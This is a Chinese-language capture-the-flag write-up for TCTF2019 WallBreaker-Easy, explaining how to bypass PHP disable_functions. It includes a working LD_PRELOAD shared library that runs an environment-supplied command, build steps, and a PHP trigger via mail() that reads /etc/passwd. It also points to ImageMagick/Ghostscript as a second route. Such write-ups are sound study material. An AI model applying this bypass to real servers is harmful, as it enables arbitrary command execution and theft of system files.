# Wallbreaker\_Easy

## Wallbreaker\_Easy

## 考点

## wp

TCTF2019 WallBreaker-Easy

提示

> Imagick is a awesome library for hackers to break `disable_functions`.&#x20;
>
> So I installed php-imagick in the server, opened a `backdoor` for you.
>
> Let's try to execute `/readflag` to get the flag.&#x20;
>
> Open basedir: /var/www/html:/tmp/ebe1d01ac021c4a3e68eb5bbdc842e69
>
> Hint: eval($\_POST\["backdoor"]);

给了shell，要命令执行，但是有disable\_functions。这题就是bypass disable\_functions

![](<../.gitbook/assets/image (7).png>)

### 利用LD\_PRELOAD变量

> LD\_PRELOAD 是一个可选的 Unix 环境变量，包含一个或多个共享库或共享库的路径，加载程序将在包含 C 运行时库（libc.so）的任何其他共享库之前加载该路径。这称为预加载库。
>
> 也就是说它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。即我们可以自己生成一个动态链接库加载，以覆盖正常的函数库，也可以注入恶意程序，执行恶意命令。

该方法绕过disable\_functions的原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令。

通用动态链接库代码

```c
#include <stdlib.h>
__attribute__((constructor)) void hack(){
    unsetenv("LD_PRELOAD");
    if (getenv("cmd") != NULL){
        system(getenv("cmd"));
    }else{
        system("echo 'no cmd' > /tmp/cmd.output");
    }
}
```

> 利用 GNU C 中的特殊语法 `__attribute__ ((attribute-list))`，当参数为 constructor 时就可以在加载共享库时运行，通常是在程序启动过程中，因为带有”构造函数”属性的函数将在 main() 函数之前被执行，类似的，若是换成 destructor 参数，则该函数会在 main() 函数执行之后或者 exit() 被调用后被自动执行
>
> 在 PHP 运行过程中只要有新程序启动，在我们加载恶意动态链接库的条件下，便可以执行 .so 中的恶意代码

使用`strace -f php -r "mail('','','','');" 2>&1 | grep -E "execve|fork|vfork"`可以看到当 PHP 执行 mail() 函数的时候有没有执行程序或者启动新进程



使用`gcc --share -fPIC bad.c -o bad.so`生成动态链接库，上传到目标机器

再使用如下语句就可以执行任意命令，除了`mail()`函数，还可以使用`error_log('',1)` 或者 `mb_send_mail('','','')` 和 `imap_mail("1@a.com","0","1","2","3")`

```php
<?php
putenv("cmd=cat /etc/passwd");
putenv("LD_PRELOAD=./bad.so");
mail('','','','');
```

但是这题使用上面的方法是不行的，因为BUU的环境有权限限制，无法上传文件。考虑使用ImageMagick bypass disable\_functions

ImageMagick在处理一些类型的文件的时候需要依赖其他软件，例如`Ghostscript`，但是默认禁止了使用`Ghostscript`处理pdf，ps，epi和xps的文件类型，`Ghostscript`能处理的如下

```
EPI  EPS  EPS2 EPS3 EPSF EPSI EPT PDF PS PS2 PS3
```

只有ept能使用。



## 小结

1. [TCTF2019 WallBreaker-Easy 解题分析](https://xz.aliyun.com/t/4688)
